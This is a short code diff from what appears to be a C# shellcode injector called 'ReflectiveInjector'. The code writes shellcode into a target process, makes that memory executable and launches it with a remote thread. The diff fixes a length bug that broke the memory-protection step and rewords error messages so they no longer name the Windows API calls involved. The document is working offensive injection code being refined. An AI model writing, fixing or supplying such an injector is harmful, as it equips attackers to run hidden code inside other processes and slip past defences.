@@ -251,12 +251,14 @@ namespace ReflectiveInjector
                 out bytesWritten
             );
 
+            int shellcodeLength = shellcode.Length;
+
             // Clear shellcode from our own process memory.
             Array.Clear(shellcode, 0, shellcode.Length);
 
             if (!writeResult)
             {
-                Console.WriteLine("[-] WriteProcessMemory failed.");
+                Console.WriteLine("[-] Memory write to target process failed.");
                 CloseHandle(processHandle);
                 return;
             }
@@ -268,7 +270,7 @@ namespace ReflectiveInjector
             VirtualProtectEx(
                 processHandle,
                 remoteMemory,
-                (UIntPtr)shellcode.Length,
+                (UIntPtr)shellcodeLength,
                 PAGE_EXECUTE_READ,
                 out oldProtect
             );
@@ -291,7 +293,7 @@ namespace ReflectiveInjector
 
             if (threadHandle == IntPtr.Zero)
             {
-                Console.WriteLine("[-] CreateRemoteThread failed.");
+                Console.WriteLine("[-] Remote thread creation failed.");
                 CloseHandle(processHandle);
                 return;
             }
